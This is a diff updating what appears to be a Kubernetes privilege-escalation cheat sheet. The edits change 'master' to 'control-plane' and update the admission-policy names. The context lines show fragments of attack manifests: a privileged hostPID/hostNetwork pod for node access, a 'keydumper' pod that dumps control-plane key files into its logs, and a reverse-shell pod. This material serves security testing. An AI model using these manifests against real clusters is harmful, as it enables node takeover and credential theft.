@@ -23,7 +23,9 @@ This won't work if :-
 
 1. You don't have right to create pods in the namespace. You'll also need rights to pod/exec in order to get the shell in the pod afterwards.
 2. The node can't pull images from Docker Hub
-3. There's PodSecurityPolicies (or equivalent) blocking the creation of privileged pods
+3. There's Pod Security Admission, Validating Admission Policy (or equivalent) blocking the creation of privileged pods
+
+You can also do this with `kubectl debug node` as a built-in feature of Kubernetes, in relatively modern clusters.
 
 ```yaml
 apiVersion: v1
@@ -33,7 +35,7 @@ metadata:
   labels:
 spec:
   tolerations:
-  - key: node-role.kubernetes.io/master
+  - key: node-role.kubernetes.io/control-plane
     effect: NoSchedule
   hostNetwork: true
   hostPID: true
@@ -81,7 +83,7 @@ spec:
         name: noderootdaemon
     spec:
       tolerations:
-      - key: node-role.kubernetes.io/master
+      - key: node-role.kubernetes.io/control-plane
         effect: NoSchedule
       hostNetwork: true
       hostPID: true
@@ -106,7 +108,7 @@ spec:
 
 In a scenario where you have create pods and access to pod logs (a right commonly given for diagnostics) but don't have pod/exec, it can still be possible to use your rights to escalate access to a cluster, by creating a pod which cat's a file to STDOUT (as this will be logged in the container logs)
 
-The manifest below is an example of this. It would work on a kubeadm cluster, when deployed to a master node. To adapt to other scenarios, just change the volume mount and file in the `command` parameter
+The manifest below is an example of this. It would work on a kubeadm cluster, when deployed to a control plane node. To adapt to other scenarios, just change the volume mount and file in the `command` parameter
 
 ```yaml
 apiVersion: v1
@@ -117,7 +119,7 @@ metadata:
     app: keydumper
 spec:
   tolerations:
-  - key: node-role.kubernetes.io/master
+  - key: node-role.kubernetes.io/control-plane
     effect: NoSchedule
   containers:
   - name: keydumper-pod
@@ -150,7 +152,7 @@ metadata:
   name: ncat-reverse-shell-pod
 spec:
   tolerations:
-  - key: node-role.kubernetes.io/master
+  - key: node-role.kubernetes.io/control-plane
     effect: NoSchedule
   containers:
   - name: ncat-reverse-shell
